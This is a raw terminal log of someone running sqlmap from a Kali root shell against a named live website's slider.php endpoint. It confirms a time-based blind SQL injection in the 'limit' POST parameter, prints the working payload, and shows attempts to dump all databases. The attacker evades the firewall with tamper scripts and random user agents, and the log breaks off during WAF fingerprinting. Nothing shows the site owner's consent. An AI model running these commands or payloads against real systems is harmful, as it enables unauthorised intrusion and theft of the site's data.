sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT" --level=3 --risk=3
limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(100000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT" --random-agent --level 5 --risk 3 --hex --time-sec=100 --tamper=between --dbs --dump-all --dbms="mysql" --threads=5 --ignore-code=500 --tamper=between -b -o --ignore-code=999 --parse-error --hex





ertgh43564564root@kali:~# sqlmap --url 'https://www.qaisare.com/includes/slider.php' --data=limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT
[1] 4210
[2] 4211
root@kali:~#         ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:03:26

[16:03:26] [INFO] testing connection to the target URL
[16:03:26] [INFO] testing if the target URL content is stable
[16:03:27] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[16:03:27] [INFO] testing if POST parameter 'limit' is dynamic
[16:03:27] [WARNING] POST parameter 'limit' does not appear to be dynamic
[16:03:28] [WARNING] heuristic (basic) test shows that POST parameter 'limit' might not be injectable
[16:03:28] [INFO] testing for SQL injection on POST parameter 'limit'
[16:03:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:03:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:03:31] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:03:32] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[16:03:33] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[16:03:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[16:03:36] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:03:36] [INFO] testing 'MySQL inline queries'
[16:03:36] [INFO] testing 'PostgreSQL inline queries'
[16:03:37] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[16:03:37] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[16:03:38] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[16:03:39] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[16:03:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[16:03:41] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[16:03:42] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[16:03:44] [INFO] testing 'Oracle AND time-based blind'
[16:03:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[16:04:00] [WARNING] POST parameter 'limit' does not seem to be injectable
[16:04:00] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')

[*] shutting down at 16:04:00

^C
[1]-  Done                    sqlmap --url 'https://www.qaisare.com/includes/slider.php' --data=limit=13
[2]+  Done                    start=0
root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT" --level=3 --risk=3 --dbms=mysql
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.10#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:06:38

[16:06:38] [INFO] testing connection to the target URL
[16:06:38] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:06:39] [INFO] testing if the target URL content is stable
[16:06:39] [INFO] target URL content is stable
[16:06:39] [INFO] testing if POST parameter 'limit' is dynamic
[16:06:39] [INFO] confirming that POST parameter 'limit' is dynamic
[16:06:40] [INFO] POST parameter 'limit' is dynamic
[16:06:40] [WARNING] heuristic (basic) test shows that POST parameter 'limit' might not be injectable
[16:06:41] [INFO] testing for SQL injection on POST parameter 'limit'
[16:06:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:06:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[16:07:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[16:07:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[16:07:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[16:07:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[16:07:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[16:07:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:07:34] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[16:07:35] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[16:07:35] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[16:07:35] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[16:07:35] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[16:07:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:07:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[16:07:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[16:08:04] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[16:08:15] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[16:08:27] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[16:08:38] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[16:08:39] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[16:08:39] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[16:08:39] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:08:45] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:08:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:08:56] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:09:02] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:09:09] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[16:09:16] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[16:09:22] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[16:09:28] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[16:09:31] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:09:36] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[16:09:36] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[16:09:36] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[16:09:37] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[16:09:37] [INFO] testing 'MySQL inline queries'
[16:09:38] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[16:09:40] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[16:09:46] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[16:09:49] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[16:09:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[16:09:57] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
[16:10:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (comment)'
[16:10:05] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (comment)'
[16:10:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:10:15] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[16:10:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[16:10:23] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[16:10:26] [INFO] testing 'MySQL <= 5.0.11 AND time-based blind (heavy query)'
[16:10:31] [INFO] testing 'MySQL <= 5.0.11 OR time-based blind (heavy query)'
[16:10:38] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[16:10:43] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[16:10:49] [INFO] testing 'MySQL AND time-based blind (ELT)'
[16:10:54] [INFO] testing 'MySQL OR time-based blind (ELT)'
[16:11:01] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[16:11:06] [INFO] POST parameter 'limit' appears to be 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)' injectable 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] y
[16:14:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:14:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:14:22] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[16:14:27] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[16:14:32] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[16:14:37] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[16:14:43] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[16:14:48] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[16:14:53] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[16:14:58] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[16:15:03] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[16:15:09] [INFO] checking if the injection point on POST parameter 'limit' is a false positive
[16:15:25] [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'
POST parameter 'limit' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 1198 HTTP(s) requests:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:15:58] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL >= 5.0.12
[16:15:58] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 16:15:58

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT" --level=3 --risk=3 --dbms=mysql --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:16:03

[16:16:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:16:04] [INFO] testing MySQL
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
[16:16:18] [INFO] confirming MySQL
[16:16:18] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[16:16:22] [INFO] adjusting time delay to 1 second due to good response times
[16:16:23] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[16:16:23] [INFO] fetching database names
[16:16:23] [INFO] fetching number of databases
[16:16:23] [INFO] retrieved: 
[16:16:23] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[16:16:23] [ERROR] unable to retrieve the number of databases
[16:16:23] [INFO] falling back to current database
[16:16:23] [INFO] fetching current database
[16:16:23] [INFO] retrieved: 
[16:16:24] [CRITICAL] unable to retrieve the database names

[*] shutting down at 16:16:24

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT" --level=3 --risk=3  --dbs --no-cast
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.10#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:16:46

[16:16:47] [INFO] resuming back-end DBMS 'mysql' 
[16:16:47] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:16:47] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[16:16:47] [INFO] fetching database names
[16:16:47] [INFO] fetching number of databases
[16:16:47] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[16:16:55] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[16:16:55] [ERROR] unable to retrieve the number of databases
[16:16:55] [INFO] falling back to current database
[16:16:55] [INFO] fetching current database
[16:16:55] [INFO] retrieved: 
[16:16:56] [CRITICAL] unable to retrieve the database names

[*] shutting down at 16:16:56

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT" --level=3 --risk=3 --no-cast --time-sec=100 --tamper=between --dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.10#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:17:41

[16:17:41] [INFO] loading tamper module 'between'
[16:17:41] [INFO] resuming back-end DBMS 'mysql' 
[16:17:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(100000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:17:41] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[16:17:41] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[16:17:41] [INFO] fetching database names
[16:17:41] [INFO] fetching number of databases
[16:17:41] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[16:17:49] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[16:17:50] [ERROR] unable to retrieve the number of databases
[16:17:50] [INFO] falling back to current database
[16:17:50] [INFO] fetching current database
[16:17:50] [INFO] retrieved: 

[16:19:58] [ERROR] invalid character detected. retrying..
^V^C

[16:21:44] [ERROR] user aborted

[*] shutting down at 16:21:44

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT" 
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.10#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:21:53

[16:21:54] [INFO] resuming back-end DBMS 'mysql' 
[16:21:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:21:54] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[16:21:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.qaisare.com'

[*] shutting down at 16:21:54

root@kali:~# --random-agent --level 5 --risk 3 --hex --time-sec=100 --tamper=between --dbs --dump-all --dbms="mysql" --threads=5 --ignore-code=500 --tamper=between -b -o --ignore-code=999 --parse-error --hex
bash: --random-agent: command not found
root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT" --random-agent --level 5 --risk 3 --hex --time-sec=100 --tamper=between --dbs --dump-all --dbms="mysql" --threads=5 --ignore-code=500 --tamper=between -b -o --ignore-code=999 --parse-error --hex
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.10#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:22:19

[16:22:19] [INFO] loading tamper module 'between'
[16:22:19] [INFO] loading tamper module 'between'
[16:22:19] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; pt-BR; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 (.NET CLR 3.5.30729)' from file '/usr/share/sqlmap/txt/user-agents.txt'
[16:22:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(100000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:22:20] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[16:22:20] [INFO] testing MySQL
[16:22:20] [INFO] confirming MySQL
[16:22:20] [INFO] the back-end DBMS is MySQL
[16:22:20] [INFO] fetching banner
[16:22:20] [WARNING] multi-threading is considered unsafe in time-based data retrieval. Going to switch it off automatically
[16:22:20] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[16:22:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[16:24:06] [ERROR] invalid character detected. retrying..
[16:24:38] [ERROR] invalid character detected. retrying..
[16:25:11] [ERROR] invalid character detected. retrying..
[16:25:45] [ERROR] invalid character detected. retrying..
[16:26:18] [ERROR] invalid character detected. retrying..
[16:26:50] [ERROR] unable to properly validate last character value ('C')..
C
^C
[16:27:15] [WARNING] HTTP error codes detected during run:
503 (Service Unavailable) - 1 times

[16:27:15] [ERROR] user aborted

[*] shutting down at 16:27:15

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --dbs --no-cast --threads 1
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.10#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:27:41

[16:27:41] [INFO] resuming back-end DBMS 'mysql' 
[16:27:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: limit (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=13 PROCEDURE ANALYSE(EXTRACTVALUE(6233,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x4a735968))))),1)&start=0&condition=ORDER BY `date_of_post` DESC LIMIT
---
[16:27:41] [INFO] the back-end DBMS is MySQL
web application technology: Apache, PHP 7.4.7
back-end DBMS: MySQL 5 (MariaDB fork)
[16:27:41] [INFO] fetching database names
[16:27:41] [INFO] fetching number of databases
[16:27:41] [WARNING] time-based comparison requires larger statistical model, please wait..............................  (done)
[16:27:49] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[16:27:50] [ERROR] unable to retrieve the number of databases
[16:27:50] [INFO] falling back to current database
[16:27:50] [INFO] fetching current database
[16:27:50] [INFO] retrieved: 
[16:27:51] [CRITICAL] unable to retrieve the database names

[*] shutting down at 16:27:51

root@kali:~# sqlmap --url "https://www.qaisare.com/includes/slider.php" --data "limit=13&start=0&condition=ORDER+BY+%60date_of_post%60+DESC+LIMIT"  --dbs --no-cast --threads 1 --identify-waf --random-agent -v 3
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.10#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 16:28:30

[16:28:30] [DEBUG] cleaning up configuration parameters
[16:28:30] [DEBUG] loading WAF script 'cloudbric'
[16:28:30] [DEBUG] loading WAF script 'uspses'
[16:28:30] [DEBUG] loading WAF script 'aws'
[16:28:30] [DEBUG] loading WAF script 'comodo'
[16:28:30] [DEBUG] loading WAF script 'asm'
[16:28:30] [DEBUG] loading WAF script 'profense'
[16:28:30] [DEBUG] loading WAF script 'dotdefender'
[16:28:30] [DEBUG] loading WAF script 'zenedge'
[16:28:30] [DEBUG] loading WAF script 'sophos'
[16:28:30] [DEBUG] loading WAF script 'yundun'
[16:28:30] [DEBUG] loading WAF script 'bigip'
[16:28:30] [DEBUG] loading WAF script 'incapsula'
[16:28:30] [DEBUG] loading WAF script 'proventia'
[16:28:30] [DEBUG] loading WAF script 'wallarm'
[16:28:30] [DEBUG] loading WAF script 'isaserver'
[16:28:30] [DEBUG] loading WAF script 'urlscan'
[16:28:30] [DEBUG] loading WAF script 'yunsuo'
[16:28:30] [DEBUG] loading WAF script 'crawlprotect'
[16:28:30] [DEBUG] loading WAF script 'safe3'
[16:28:30] [DEBUG] loading WAF script 'expressionengine'
[16:28:30] [DEBUG] loading WAF script 'webknight'
[16:28:30] [DEBUG] loading WAF script 'radware'
[16:28:30] [DEBUG] loading WAF script '360'
[16:28:30] [DEBUG] loading WAF script 'newdefend'
[16:28:30] [DEBUG] loading WAF script 'webappsecure'
[16:28:30] [DEBUG] loading WAF script 'barracuda'
[16:28:30] [DEBUG] loading WAF script 'teros'
[16:28:30] [DEBUG] loading WAF script 'varnish'
[16:28:30] [DEBUG] loading WAF script 'requestvalidationmode'
[16:28:30] [DEBUG] loading WAF script 'tencent'
[16:28:30] [DEBUG] loading WAF script 'binarysec'
[16:28:30] [DEBUG] loading WAF script 'watchguard'
[16:28:30] [DEBUG] loading WAF script 'cloudfront'
[16:28:30] [DEBUG] loading WAF script 'knownsec'
[16:28:30] [DEBUG] loading WAF script 'jiasule'
[16:28:30] [DEBUG] loading WAF script 'blockdos'
[16:28:30] [DEBUG] loading WAF script 'datapower'
[16:28:30] [DEBUG] loading WAF script 'wordfence'
[16:28:30] [DEBUG] loading WAF script 'armor'
[16:28:30] [DEBUG] loading WAF script 'generic'
[16:28:30] [DEBUG] loading WAF script 'denyall'
[16:28:30] [DEBUG] loading WAF script 'edgecast'
[16:28:30] [DEBUG] loading WAF script 'paloalto'
[16:28:30] [DEBUG] loading WAF script 'stingray'
[16:28:30] [DEBUG] loading WAF script 'modsecurity'
[16:28:30] [DEBUG] loading WAF script 'anquanbao'
[16:28:30] [DEBUG] loading WAF script 'ciscoacexml'
[16:28:30] [DEBUG] loading WAF script 'fortiweb'
[16:28:30] [DEBUG] loading WAF script 'airlock'
[16:28:30] [DEBUG] loading WAF script 'kona'
[16:28:30] [DEBUG] loading WAF script 'trafficshield'
[16:28:30] [DEBUG] loading WAF script 'dosarrest'
[16:28:30] [DEBUG] loading WAF script 'hyperguard'
[16:28:30] [DEBUG] loading WAF script 'nsfocus'
[16:28:30] [DEBUG] loading WAF script 'netcontinuum'
[16:28:30] [DEBUG] loading WAF script 'cloudflare'
[16:28:30] [DEBUG] loading WAF script 'senginx'
[16:28:30] [DEBUG] loading WAF script 'safedog'
[16:28:30] [DEBUG] loading WAF script 'sucuri'
[16:28:30] [DEBUG] loading WAF script 'aesecure'
[16:28:30] [DEBUG] loading WAF script 'sonicwall'
[16:28:30] [DEBUG] loading WAF script 'sitelock'
[16:28:30] [DEBUG] loading WAF script 'secureiis'
[16:28:30] [DEBUG] loading WAF script 'naxsi'
[16:28:30] [DEBUG] loading WAF script 'distil'
[16:28:30] [DEBUG] loading WAF script 'reblaze'
[16:28:30] [DEBUG] loading WAF script 'netscaler'
[16:28:30] [DEBUG] loading WAF script 'baidu'
[16:28:30] [DEBUG] setting the HTTP timeout
[16:28:30] [DEBUG] loading random HTTP User-Agent header(s) from file '/usr/share/sqlmap/txt/user-agents.txt'
[16:28:30] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux ppc; da-DK; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)' from file '/usr/share/sqlmap/txt/user-agents.txt'
[16:28:30] [DEBUG] creating HTTP requests opener object
[16:28:30] [INFO] resuming back-end DBMS 'mysql' 
[16:28:30] [DEBUG] resolving hostname 'www.qaisare.com'
[16:28:30] [INFO] testing connection to the target URL
[16:28:30] [DEBUG] declared web page charset 'utf-8'
[16:28:30] [INFO] using WAF scripts to detect backend WAF/IPS protection
[16:28:30] [DEBUG] checking for WAF/IPS product 'Cloudbric Web Application Firewall (Cloudbric)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'USP Secure Entry Server (United Security Providers)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Amazon Web Services Web Application Firewall (Amazon)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Comodo Web Application Firewall (Comodo)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Application Security Manager (F5 Networks)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'Profense Web Application Firewall (Armorlogic)'
[16:28:32] [DEBUG] checking for WAF/IPS product 'dotDefender (Applicure Technologies)'
